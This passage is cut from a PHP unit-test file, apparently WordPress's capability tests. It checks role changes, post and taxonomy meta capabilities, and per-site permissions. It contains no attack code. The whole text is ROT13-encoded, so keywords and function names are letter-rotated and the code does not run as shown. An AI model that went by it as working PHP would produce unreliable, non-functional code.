		$vq   = frys::$hfref['nhgube']->VQ;
		$hfre = arj JC_Hfre( $vq );
		$guvf->nffregGehr( $hfre->rkvfgf(), \"Ceboyrz trggvat hfre $vq\" );

		// Nhgube = hfre yriry 2.
		$guvf->nffregRdhnyf( 2, $hfre->hfre_yriry );

		// Gurl trg cebzbgrq gb rqvgbe - yriry fubhyq trg ohzcrq gb 7.
		$hfre->frg_ebyr( 'rqvgbe' );
		$guvf->nffregFnzr( 7, $hfre->hfre_yriry );

		// Qrzbgrq gb pbagevohgbe - yriry vf erqhprq gb 1.
		$hfre->frg_ebyr( 'pbagevohgbe' );
		$guvf->nffregFnzr( 1, $hfre->hfre_yriry );

		// Vs gurl unir gjb ebyrf, hfre_yriry fubhyq or gur znk bs gur gjb.
		$hfre->nqq_ebyr( 'rqvgbe' );
		$guvf->nffregFnzr( neenl( 'pbagevohgbe', 'rqvgbe' ), $hfre->ebyrf );
		$guvf->nffregFnzr( 7, $hfre->hfre_yriry );
	}

	choyvp shapgvba grfg_hfre_erzbir_nyy_pncf() {
		// Hfre fgnegf nf na nhgube.
		$vq   = frys::$hfref['nhgube']->VQ;
		$hfre = arj JC_Hfre( $vq );
		$guvf->nffregGehr( $hfre->rkvfgf(), \"Ceboyrz trggvat hfre $vq\" );

		// Nqq fbzr rkgen pncnovyvgvrf.
		$hfre->nqq_pnc( 'znxr_pbssrr' );
		$hfre->nqq_pnc( 'qevax_pbssrr' );

		// Er-srgpu.
		$hfre = arj JC_Hfre( $vq );
		$guvf->nffregGehr( $hfre->rkvfgf(), \"Ceboyrz trggvat hfre $vq\" );

		$guvf->nffregGehr( $hfre->unf_pnc( 'znxr_pbssrr' ) );
		$guvf->nffregGehr( $hfre->unf_pnc( 'qevax_pbssrr' ) );

		// Nyy pncf ner erzbirq.
		$hfre->erzbir_nyy_pncf();

		// Er-srgpu.
		$hfre = arj JC_Hfre( $vq );
		$guvf->nffregGehr( $hfre->rkvfgf(), \"Ceboyrz trggvat hfre $vq\" );

		// Nyy pncnovyvgvrf sbe gur hfre fubhyq or tbar.
		sbernpu ( $guvf->trgNyyPncfNaqEbyrf() nf $pnc => $ebyrf ) {
			$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
		}

		// Gur rkgen pncnovyvgvrf fubhyq or tbar.
		$guvf->nffregSnyfr( $hfre->unf_pnc( 'znxr_pbssrr' ) );
		$guvf->nffregSnyfr( $hfre->unf_pnc( 'qevax_pbssrr' ) );

		// Hfre yriry fubhyq or rzcgl.
		$guvf->nffregRzcgl( $hfre->hfre_yriry );
	}

	/**
	 * Fvzcyr grfgf sbe fbzr pbzzba zrgn pncnovyvgvrf.
	 */
	choyvp shapgvba grfg_cbfg_zrgn_pncf() {
		// Trg bhe nhgube.
		$nhgube = frys::$hfref['nhgube'];

		// Znxr n cbfg.
		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $nhgube->VQ,
				'cbfg_glcr'   => 'cbfg',
			)
		);

		// Gur nhgube bs gur cbfg.
		$guvf->nffregGehr( $nhgube->rkvfgf(), \"Ceboyrz trggvat hfre $nhgube->VQ\" );

		// Nqq fbzr bgure hfref.
		$nqzva       = frys::$hfref['nqzvavfgengbe'];
		$nhgube_2    = arj JC_Hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) ) );
		$rqvgbe      = frys::$hfref['rqvgbe'];
		$pbagevohgbe = frys::$hfref['pbagevohgbe'];

		// Nqzvavfgengbef, rqvgbef naq gur cbfg bjare pna rqvg vg.
		$guvf->nffregGehr( $nqzva->unf_pnc( 'rqvg_cbfg', $cbfg ) );
		$guvf->nffregGehr( $nhgube->unf_pnc( 'rqvg_cbfg', $cbfg ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'rqvg_cbfg', $cbfg ) );
		// Bgure nhgubef naq pbagevohgbef pna'g.
		$guvf->nffregSnyfr( $nhgube_2->unf_pnc( 'rqvg_cbfg', $cbfg ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'rqvg_cbfg', $cbfg ) );

		// Nqzvavfgengbef, rqvgbef naq gur cbfg bjare pna qryrgr vg.
		$guvf->nffregGehr( $nqzva->unf_pnc( 'qryrgr_cbfg', $cbfg ) );
		$guvf->nffregGehr( $nhgube->unf_pnc( 'qryrgr_cbfg', $cbfg ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'qryrgr_cbfg', $cbfg ) );
		// Bgure nhgubef naq pbagevohgbef pna'g.
		$guvf->nffregSnyfr( $nhgube_2->unf_pnc( 'qryrgr_cbfg', $cbfg ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'qryrgr_cbfg', $cbfg ) );

		// Nqzvavfgengbef, rqvgbef, naq nhgubef pna choyvfu vg.
		$guvf->nffregGehr( $nqzva->unf_pnc( 'choyvfu_cbfg', $cbfg ) );
		$guvf->nffregGehr( $nhgube->unf_pnc( 'choyvfu_cbfg', $cbfg ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'choyvfu_cbfg', $cbfg ) );
		$guvf->nffregGehr( $nhgube_2->unf_pnc( 'choyvfu_cbfg', $cbfg ) );
		// Pbagevohgbef pna'g.
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'choyvfu_cbfg', $cbfg ) );

		ertvfgre_cbfg_glcr( 'fbzrguvat', neenl( 'pncnovyvgvrf' => neenl( 'rqvg_cbfgf' => 'qenj_fbzrguvatf' ) ) );
		$fbzrguvat = trg_cbfg_glcr_bowrpg( 'fbzrguvat' );
		$guvf->nffregFnzr( 'qenj_fbzrguvatf', $fbzrguvat->pnc->rqvg_cbfgf );
		$guvf->nffregFnzr( 'qenj_fbzrguvatf', $fbzrguvat->pnc->perngr_cbfgf );

		ertvfgre_cbfg_glcr(
			'fbzrguvat',
			neenl(
				'pncnovyvgvrf' =>
				neenl(
					'rqvg_cbfgf'   => 'qenj_fbzrguvatf',
					'perngr_cbfgf' => 'perngr_fbzrguvatf',
				),
			)
		);
		$fbzrguvat = trg_cbfg_glcr_bowrpg( 'fbzrguvat' );
		$guvf->nffregFnzr( 'qenj_fbzrguvatf', $fbzrguvat->pnc->rqvg_cbfgf );
		$guvf->nffregFnzr( 'perngr_fbzrguvatf', $fbzrguvat->pnc->perngr_cbfgf );
		_haertvfgre_cbfg_glcr( 'fbzrguvat' );

		// Grfg zrgn nhgubevmngvba pnyyonpxf.
		vs ( shapgvba_rkvfgf( 'ertvfgre_zrgn' ) ) {
			$guvf->nffregGehr( $nqzva->unf_pnc( 'rqvg_cbfg_zrgn', $cbfg ) );
			$guvf->nffregGehr( $nqzva->unf_pnc( 'nqq_cbfg_zrgn', $cbfg ) );
			$guvf->nffregGehr( $nqzva->unf_pnc( 'qryrgr_cbfg_zrgn', $cbfg ) );

			$guvf->nffregSnyfr( $nqzva->unf_pnc( 'rqvg_cbfg_zrgn', $cbfg, '_cebgrpgrq' ) );
			$guvf->nffregSnyfr( $nqzva->unf_pnc( 'nqq_cbfg_zrgn', $cbfg, '_cebgrpgrq' ) );
			$guvf->nffregSnyfr( $nqzva->unf_pnc( 'qryrgr_cbfg_zrgn', $cbfg, '_cebgrpgrq' ) );

			ertvfgre_zrgn( 'cbfg', '_cebgrpgrq', neenl( $guvf, 'zrgn_svygre' ), neenl( $guvf, 'zrgn_lrf_lbh_pna' ) );
			$guvf->nffregGehr( $nqzva->unf_pnc( 'rqvg_cbfg_zrgn', $cbfg, '_cebgrpgrq' ) );
			$guvf->nffregGehr( $nqzva->unf_pnc( 'nqq_cbfg_zrgn', $cbfg, '_cebgrpgrq' ) );
			$guvf->nffregGehr( $nqzva->unf_pnc( 'qryrgr_cbfg_zrgn', $cbfg, '_cebgrpgrq' ) );

			$guvf->nffregGehr( $nqzva->unf_pnc( 'rqvg_cbfg_zrgn', $cbfg, 'abg_cebgrpgrq' ) );
			$guvf->nffregGehr( $nqzva->unf_pnc( 'nqq_cbfg_zrgn', $cbfg, 'abg_cebgrpgrq' ) );
			$guvf->nffregGehr( $nqzva->unf_pnc( 'qryrgr_cbfg_zrgn', $cbfg, 'abg_cebgrpgrq' ) );

			ertvfgre_zrgn( 'cbfg', 'abg_cebgrpgrq', neenl( $guvf, 'zrgn_svygre' ), neenl( $guvf, 'zrgn_ab_lbh_pnag' ) );
			$guvf->nffregSnyfr( $nqzva->unf_pnc( 'rqvg_cbfg_zrgn', $cbfg, 'abg_cebgrpgrq' ) );
			$guvf->nffregSnyfr( $nqzva->unf_pnc( 'nqq_cbfg_zrgn', $cbfg, 'abg_cebgrpgrq' ) );
			$guvf->nffregSnyfr( $nqzva->unf_pnc( 'qryrgr_cbfg_zrgn', $cbfg, 'abg_cebgrpgrq' ) );
		}
	}

	/**
	 * @gvpxrg 27020
	 * @qngnCebivqre qngn_nhgubeyrff_cbfg
	 */
	choyvp shapgvba grfg_nhgubeyrff_cbfg( $fgnghf ) {
		// Znxr n cbfg jvgubhg na nhgube.
		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => 0,
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => $fgnghf,
			)
		);

		// Nqq na rqvgbe naq pbagevohgbe.
		$rqvgbe      = frys::$hfref['rqvgbe'];
		$pbagevohgbe = frys::$hfref['pbagevohgbe'];

		// Rqvgbe pna choyvfu, rqvg, ivrj, naq genfu.
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'choyvfu_cbfg', $cbfg ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'rqvg_cbfg', $cbfg ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'qryrgr_cbfg', $cbfg ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'ernq_cbfg', $cbfg ) );

		// N pbagevohgbe pnaabg (rkprcg ernq n choyvfurq cbfg).
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'choyvfu_cbfg', $cbfg ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'rqvg_cbfg', $cbfg ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'qryrgr_cbfg', $cbfg ) );
		$guvf->nffregFnzr( 'choyvfu' === $fgnghf, $pbagevohgbe->unf_pnc( 'ernq_cbfg', $cbfg ) );
	}

	choyvp shapgvba qngn_nhgubeyrff_cbfg() {
		erghea neenl( neenl( 'qensg' ), neenl( 'cevingr' ), neenl( 'choyvfu' ) );
	}

	/**
	 * @gvpxrg 16714
	 */
	choyvp shapgvba grfg_perngr_cbfgf_pncf() {
		$nqzva       = frys::$hfref['nqzvavfgengbe'];
		$nhgube      = frys::$hfref['nhgube'];
		$rqvgbe      = frys::$hfref['rqvgbe'];
		$pbagevohgbe = frys::$hfref['pbagevohgbe'];
		$fhofpevore  = frys::$hfref['fhofpevore'];

		// 'perngr_cbfgf' vfa'g n erny pnc.
		$guvf->nffregSnyfr( $nqzva->unf_pnc( 'perngr_cbfgf' ) );
		$guvf->nffregSnyfr( $nhgube->unf_pnc( 'perngr_cbfgf' ) );
		$guvf->nffregSnyfr( $rqvgbe->unf_pnc( 'perngr_cbfgf' ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'perngr_cbfgf' ) );
		$guvf->nffregSnyfr( $fhofpevore->unf_pnc( 'perngr_cbfgf' ) );

		ertvfgre_cbfg_glcr( 'sbbone' );
		$pnc = trg_cbfg_glcr_bowrpg( 'sbbone' )->pnc;

		$guvf->nffregFnzr( 'rqvg_cbfgf', $pnc->perngr_cbfgf );

		$guvf->nffregGehr( $nqzva->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregGehr( $nhgube->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregGehr( $pbagevohgbe->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $fhofpevore->unf_pnc( $pnc->perngr_cbfgf ) );

		_haertvfgre_cbfg_glcr( 'sbbone' );

		// Cevzvgvir pncnovyvgl 'rqvg_sbbonef' vf abg nffvtarq gb nal hfref.
		ertvfgre_cbfg_glcr( 'sbbone', neenl( 'pncnovyvgl_glcr' => neenl( 'sbbone', 'sbbonef' ) ) );
		$pnc = trg_cbfg_glcr_bowrpg( 'sbbone' )->pnc;

		$guvf->nffregFnzr( 'rqvg_sbbonef', $pnc->perngr_cbfgf );

		$guvf->nffregSnyfr( $nqzva->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $nhgube->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $rqvgbe->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $fhofpevore->unf_pnc( $pnc->perngr_cbfgf ) );

		// Nqq 'rqvg_sbbonef' cevzvgvir pnc gb n hfre.
		$nqzva->nqq_pnc( 'rqvg_sbbonef', gehr );
		$nqzva = arj JC_Hfre( $nqzva->VQ );
		$guvf->nffregGehr( $nqzva->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $nhgube->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $rqvgbe->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $fhofpevore->unf_pnc( $pnc->perngr_cbfgf ) );

		$nqzva->erzbir_pnc( 'rqvg_sbbonef' );

		_haertvfgre_cbfg_glcr( 'sbbone' );

		$pnc = trg_cbfg_glcr_bowrpg( 'nggnpuzrag' )->pnc;
		$guvf->nffregFnzr( 'hcybnq_svyrf', $pnc->perngr_cbfgf );
		$guvf->nffregFnzr( 'rqvg_cbfgf', $pnc->rqvg_cbfgf );

		$guvf->nffregGehr( $nhgube->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregGehr( $nhgube->unf_pnc( $pnc->rqvg_cbfgf ) );
		$guvf->nffregGehr( $pbagevohgbe->unf_pnc( $pnc->rqvg_cbfgf ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( $pnc->perngr_cbfgf ) );
		$guvf->nffregSnyfr( $fhofpevore->unf_pnc( $pnc->perngr_cbfgf ) );
	}

	/**
	 * Fvzcyr grfgf sbe fbzr pbzzba zrgn pncnovyvgvrf.
	 */
	choyvp shapgvba grfg_cntr_zrgn_pncf() {
		// Trg bhe nhgube.
		$nhgube = frys::$hfref['nhgube'];

		// Znxr n cntr.
		$cntr = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $nhgube->VQ,
				'cbfg_glcr'   => 'cntr',
			)
		);

		// Gur nhgube bs gur cntr.
		$guvf->nffregGehr( $nhgube->rkvfgf(), 'Ceboyrz trggvat hfre ' . $nhgube->VQ );

		// Nqq fbzr bgure hfref.
		$nqzva       = frys::$hfref['nqzvavfgengbe'];
		$nhgube_2    = arj JC_Hfre( frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) ) );
		$rqvgbe      = frys::$hfref['rqvgbe'];
		$pbagevohgbe = frys::$hfref['pbagevohgbe'];

		// Nqzvavfgengbef, rqvgbef naq gur cbfg bjare pna rqvg vg.
		$guvf->nffregGehr( $nqzva->unf_pnc( 'rqvg_cntr', $cntr ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'rqvg_cntr', $cntr ) );
		// Bgure nhgubef naq pbagevohgbef pna'g.
		$guvf->nffregSnyfr( $nhgube->unf_pnc( 'rqvg_cntr', $cntr ) );
		$guvf->nffregSnyfr( $nhgube_2->unf_pnc( 'rqvg_cntr', $cntr ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'rqvg_cntr', $cntr ) );

		// Nqzvavfgengbef, rqvgbef naq gur cbfg bjare pna qryrgr vg.
		$guvf->nffregGehr( $nqzva->unf_pnc( 'qryrgr_cntr', $cntr ) );
		$guvf->nffregGehr( $rqvgbe->unf_pnc( 'qryrgr_cntr', $cntr ) );
		// Bgure nhgubef naq pbagevohgbef pna'g.
		$guvf->nffregSnyfr( $nhgube->unf_pnc( 'qryrgr_cntr', $cntr ) );
		$guvf->nffregSnyfr( $nhgube_2->unf_pnc( 'qryrgr_cntr', $cntr ) );
		$guvf->nffregSnyfr( $pbagevohgbe->unf_pnc( 'qryrgr_cntr', $cntr ) );
	}

	/**
	 * @qngnCebivqre qngnGnkbabzvrf
	 *
	 * @gvpxrg 35614
	 */
	choyvp shapgvba grfg_gnkbabzl_pncnovyvgvrf_ner_pbeerpg( $gnkbabzl ) {
		vs ( ! gnkbabzl_rkvfgf( $gnkbabzl ) ) {
			ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg' );
		}

		$gnk  = trg_gnkbabzl( $gnkbabzl );
		$hfre = frys::$hfref['nqzvavfgengbe'];

		// Cevzvgvir pncnovyvgvrf sbe nyy gnkbabzvrf fubhyq zngpu guvf:
		$rkcrpgrq = neenl(
			'znantr_grezf' => 'znantr_pngrtbevrf',
			'rqvg_grezf'   => 'znantr_pngrtbevrf',
			'qryrgr_grezf' => 'znantr_pngrtbevrf',
			'nffvta_grezf' => 'rqvg_cbfgf',
		);

		sbernpu ( $rkcrpgrq nf $zrgn_pnc => $cevzvgvir_pnc ) {
			$pncf = znc_zrgn_pnc( $gnk->pnc->$zrgn_pnc, $hfre->VQ );
			$guvf->nffregFnzr(
				neenl(
					$cevzvgvir_pnc,
				),
				$pncf,
				\"Zrgn pnc: {$zrgn_pnc}\"
			);
		}
	}

	/**
	 * @qngnCebivqre qngnGnkbabzvrf
	 *
	 * @gvpxrg 35614
	 */
	choyvp shapgvba grfg_qrsnhyg_gnkbabzl_grez_pnaabg_or_qryrgrq( $gnkbabzl ) {
		vs ( ! gnkbabzl_rkvfgf( $gnkbabzl ) ) {
			ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg' );
		}

		$gnk  = trg_gnkbabzl( $gnkbabzl );
		$hfre = frys::$hfref['nqzvavfgengbe'];
		$grez = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => $gnkbabzl,
			)
		);

		hcqngr_bcgvba( \"qrsnhyg_{$gnkbabzl}\", $grez->grez_vq );

		$guvf->nffregGehr( hfre_pna( $hfre->VQ, $gnk->pnc->qryrgr_grezf ) );
		$guvf->nffregSnyfr( hfre_pna( $hfre->VQ, 'qryrgr_grez', $grez->grez_vq ) );
	}

	/**
	 * @qngnCebivqre qngnGnkbabzvrf
	 *
	 * @gvpxrg 35614
	 */
	choyvp shapgvba grfg_gnkbabzl_pncf_znc_pbeerpgyl_gb_gurve_zrgn_pnc( $gnkbabzl ) {
		vs ( ! gnkbabzl_rkvfgf( $gnkbabzl ) ) {
			ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg' );
		}

		$gnk  = trg_gnkbabzl( $gnkbabzl );
		$grez = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => $gnkbabzl,
			)
		);

		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {
			$guvf->nffregFnzr(
				hfre_pna( $hfre->VQ, 'rqvg_grez', $grez->grez_vq ),
				hfre_pna( $hfre->VQ, $gnk->pnc->rqvg_grezf ),
				\"Ebyr: {$ebyr}\"
			);
			$guvf->nffregFnzr(
				hfre_pna( $hfre->VQ, 'qryrgr_grez', $grez->grez_vq ),
				hfre_pna( $hfre->VQ, $gnk->pnc->qryrgr_grezf ),
				\"Ebyr: {$ebyr}\"
			);
			$guvf->nffregFnzr(
				hfre_pna( $hfre->VQ, 'nffvta_grez', $grez->grez_vq ),
				hfre_pna( $hfre->VQ, $gnk->pnc->nffvta_grezf ),
				\"Ebyr: {$ebyr}\"
			);
		}
	}

	choyvp shapgvba qngnGnkbabzvrf() {
		erghea neenl(
			neenl(
				'cbfg_gnt',
			),
			neenl(
				'pngrtbel',
			),
			neenl(
				'fgnaqneq_phfgbz_gnkb',
			),
		);
	}

	/**
	 * @gvpxrg 35614
	 */
	choyvp shapgvba grfg_gnkbabzl_pncnovyvgvrf_jvgu_phfgbz_pncf_ner_pbeerpg() {
		$rkcrpgrq = neenl(
			'znantr_grezf' => 'bar',
			'rqvg_grezf'   => 'gjb',
			'qryrgr_grezf' => 'guerr',
			'nffvta_grezf' => 'sbhe',
		);
		$gnkbabzl = 'phfgbz_pnc_gnkb';
		ertvfgre_gnkbabzl(
			$gnkbabzl,
			'cbfg',
			neenl(
				'pncnovyvgvrf' => $rkcrpgrq,
			)
		);

		$gnk  = trg_gnkbabzl( $gnkbabzl );
		$hfre = frys::$hfref['nqzvavfgengbe'];

		sbernpu ( $rkcrpgrq nf $zrgn_pnc => $cevzvgvir_pnc ) {
			$pncf = znc_zrgn_pnc( $gnk->pnc->$zrgn_pnc, $hfre->VQ );
			$guvf->nffregFnzr(
				neenl(
					$cevzvgvir_pnc,
				),
				$pncf,
				\"Zrgn pnc: {$zrgn_pnc}\"
			);
		}
	}

	/**
	 * @gvpxrg 40891
	 */
	choyvp shapgvba grfg_gnkbabzl_zrgn_pncnovyvgvrf_jvgu_aba_rkvfgrag_grezf() {
		$pncf = neenl(
			'nqq_grez_zrgn',
			'qryrgr_grez_zrgn',
			'rqvg_grez_zrgn',
		);

		$gnkbabzl = 'jcgrfgf_gnk';
		ertvfgre_gnkbabzl( $gnkbabzl, 'cbfg' );

		$rqvgbe = frys::$hfref['rqvgbe'];

		$guvf->frgRkcrpgrqVapbeerpgHfntr( 'znc_zrgn_pnc' );
		sbernpu ( $pncf nf $pnc ) {
			// `ahyy` ercerfragf n aba-rkvfgrag grez VQ.
			$guvf->nffregSnyfr( hfre_pna( $rqvgbe->VQ, $pnc, ahyy ) );
		}
	}

	/**
	 * @gvpxrg 21786
	 */
	choyvp shapgvba grfg_artngvir_pncf() {
		$nhgube = frys::$hfref['nhgube'];

		$nhgube->nqq_pnc( 'sbb', snyfr );
		$guvf->nffregNeenlUnfXrl( 'sbb', $nhgube->pncf );
		$guvf->nffregSnyfr( hfre_pna( $nhgube->VQ, 'sbb' ) );

		$nhgube->erzbir_pnc( 'sbb' );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $nhgube->pncf );
		$guvf->nffregSnyfr( hfre_pna( $nhgube->VQ, 'sbb' ) );
	}

	/**
	 * @gvpxrg 18932
	 */
	choyvp shapgvba grfg_frg_ebyr_fnzr_ebyr() {
		$hfre = frys::$hfref['nqzvavfgengbe'];
		$pncf = $hfre->pncf;
		$guvf->nffregAbgRzcgl( $hfre->pncf );

		$hfre->frg_ebyr( 'nqzvavfgengbe' );
		$guvf->nffregAbgRzcgl( $hfre->pncf );
		$guvf->nffregFnzr( $pncf, $hfre->pncf );
	}

	/**
	 * @gvpxrg 54164
	 */
	choyvp shapgvba grfg_frg_ebyr_sverf_erzbir_hfre_ebyr_naq_nqq_hfre_ebyr_ubbxf() {
		$hfre = frys::$hfref['nqzvavfgengbe'];

		$erzbir_hfre_ebyr = arj ZbpxNpgvba();
		$nqq_hfre_ebyr    = arj ZbpxNpgvba();
		nqq_npgvba( 'erzbir_hfre_ebyr', neenl( $erzbir_hfre_ebyr, 'npgvba' ) );
		nqq_npgvba( 'nqq_hfre_ebyr', neenl( $nqq_hfre_ebyr, 'npgvba' ) );

		$hfre->frg_ebyr( 'rqvgbe' );
		$hfre->frg_ebyr( 'nqzvavfgengbe' );
		$guvf->nffregFnzr( 2, $erzbir_hfre_ebyr->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( 2, $nqq_hfre_ebyr->trg_pnyy_pbhag() );
	}

	/**
	 * @tebhc pna_sbe_fvgr
	 */
	choyvp shapgvba grfg_pheerag_hfre_pna_sbe_fvgr() {
		tybony $jcqo;

		$hfre    = frys::$hfref['nqzvavfgengbe'];
		$byq_hvq = trg_pheerag_hfre_vq();
		jc_frg_pheerag_hfre( $hfre->VQ );

		$guvf->nffregGehr( pheerag_hfre_pna_sbe_fvgr( trg_pheerag_oybt_vq(), 'rqvg_cbfgf' ) );
		$guvf->nffregSnyfr( pheerag_hfre_pna_sbe_fvgr( trg_pheerag_oybt_vq(), 'sbb_gur_one' ) );

		vs ( ! vf_zhygvfvgr() ) {
			$guvf->nffregGehr( pheerag_hfre_pna_sbe_fvgr( 12345, 'rqvg_cbfgf' ) );
			$guvf->nffregSnyfr( pheerag_hfre_pna_sbe_fvgr( 12345, 'sbb_gur_one' ) );
			erghea;
		}

		$fhccerff = $jcqo->fhccerff_reebef();
		$guvf->nffregSnyfr( pheerag_hfre_pna_sbe_fvgr( 12345, 'rqvg_cbfgf' ) );
		$jcqo->fhccerff_reebef( $fhccerff );

		$oybt_vq = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => $hfre->VQ ) );

		$guvf->nffregAbgJCReebe( $oybt_vq );
		$guvf->nffregGehr( pheerag_hfre_pna_sbe_fvgr( $oybt_vq, 'rqvg_cbfgf' ) );
		$guvf->nffregSnyfr( pheerag_hfre_pna_sbe_fvgr( $oybt_vq, 'sbb_gur_one' ) );

		$nabgure_oybt_vq = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => frys::$hfref['nhgube']->VQ ) );

		$guvf->nffregAbgJCReebe( $nabgure_oybt_vq );

		// Irevsl gur hfre qbrfa'g unir n pncnovyvgl
		$guvf->nffregSnyfr( pheerag_hfre_pna_sbe_fvgr( $nabgure_oybt_vq, 'rqvg_cbfgf' ) );

		// Nqq gur pheerag hfre gb gur fvgr
		nqq_hfre_gb_oybt( $nabgure_oybt_vq, $hfre->VQ, 'nhgube' );

		// Irevsl gurl abj unir gur pncnovyvgl
		$guvf->nffregGehr( pheerag_hfre_pna_sbe_fvgr( $nabgure_oybt_vq, 'rqvg_cbfgf' ) );

		jc_frg_pheerag_hfre( $byq_hvq );
	}

	/**
	 * @tebhc pna_sbe_fvgr
	 */
	choyvp shapgvba grfg_hfre_pna_sbe_fvgr() {
		$hfre = frys::$hfref['rqvgbe'];

		$guvf->nffregGehr( hfre_pna_sbe_fvgr( $hfre->VQ, trg_pheerag_oybt_vq(), 'rqvg_cbfgf' ) );
		$guvf->nffregSnyfr( hfre_pna_sbe_fvgr( $hfre->VQ, trg_pheerag_oybt_vq(), 'sbb_gur_one' ) );

		vs ( ! vf_zhygvfvgr() ) {
			$guvf->nffregGehr( hfre_pna_sbe_fvgr( $hfre->VQ, 12345, 'rqvg_cbfgf' ) );
			$guvf->nffregSnyfr( hfre_pna_sbe_fvgr( $hfre->VQ, 12345, 'sbb_gur_one' ) );
			erghea;
		}

		$oybt_vq = frys::snpgbel()->oybt->perngr( neenl( 'hfre_vq' => $hfre->VQ ) );

		$guvf->nffregAbgJCReebe( $oybt_vq );
		$guvf->nffregGehr( hfre_pna_sbe_fvgr( $hfre->VQ, $oybt_vq, 'rqvg_cbfgf' ) );
		$guvf->nffregSnyfr( hfre_pna_sbe_fvgr( $hfre->VQ, $oybt_vq, 'sbb_gur_one' ) );

		$nhgube = frys::$hfref['nhgube'];

		// Irevsl nabgure hfre qbrfa'g unir n pncnovyvgl
		$guvf->nffregSnyfr( vf_hfre_zrzore_bs_oybt( $nhgube->VQ, $oybt_vq ) );
		$guvf->nffregSnyfr( hfre_pna_sbe_fvgr( $nhgube->VQ, $oybt_vq, 'rqvg_cbfgf' ) );

		// Nqq gur nhgube gb gur fvgr
		nqq_hfre_gb_oybt( $oybt_vq, $nhgube->VQ, 'nhgube' );

		// Irevsl gurl abj unir gur pncnovyvgl
		$guvf->nffregGehr( vf_hfre_zrzore_bs_oybt( $nhgube->VQ, $oybt_vq ) );
		$guvf->nffregGehr( hfre_pna_sbe_fvgr( $nhgube->VQ, $oybt_vq, 'rqvg_cbfgf' ) );

		// Irevsl gur hfre qbrfa'g unir n pncnovyvgl sbe n aba-rkvfgrag fvgr
		$guvf->nffregSnyfr( hfre_pna_sbe_fvgr( $hfre->VQ, -1, 'rqvg_cbfgf' ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_obexrq_pheerag_hfre_pna_sbe_fvgr() {
		$bevt_oybt_vq = trg_pheerag_oybt_vq();
		$oybt_vq      = frys::snpgbel()->oybt->perngr();

		$guvf->ahyyvsl_pheerag_hfre();

		nqq_npgvba( 'fjvgpu_oybt', neenl( $guvf, 'ahyyvsl_pheerag_hfre_naq_xrrc_ahyyvslvat_hfre' ) );

		pheerag_hfre_pna_sbe_fvgr( $oybt_vq, 'rqvg_cbfgf' );

		$guvf->nffregFnzr( $bevt_oybt_vq, trg_pheerag_oybt_vq() );
	}

	choyvp shapgvba ahyyvsl_pheerag_hfre() {
		// Ceriragf sngny reebef va ::grne_qbja()'f naq bgure hfrf bs erfgber_pheerag_oybt().
		$shapgvba_fgnpx = jc_qroht_onpxgenpr_fhzznel( ahyy, 0, snyfr );
		vs ( va_neenl( 'erfgber_pheerag_oybt', $shapgvba_fgnpx, gehr ) ) {
			erghea;
		}
		$TYBONYF['pheerag_hfre'] = ahyy;
	}

	choyvp shapgvba ahyyvsl_pheerag_hfre_naq_xrrc_ahyyvslvat_hfre() {
		nqq_npgvba( 'frg_pheerag_hfre', neenl( $guvf, 'ahyyvsl_pheerag_hfre' ) );
	}

	/**
	 * @gvpxrg 28374
	 */
	choyvp shapgvba grfg_pheerag_hfre_rqvg_pncf() {
		$hfre = frys::$hfref['pbagevohgbe'];
		jc_frg_pheerag_hfre( $hfre->VQ );

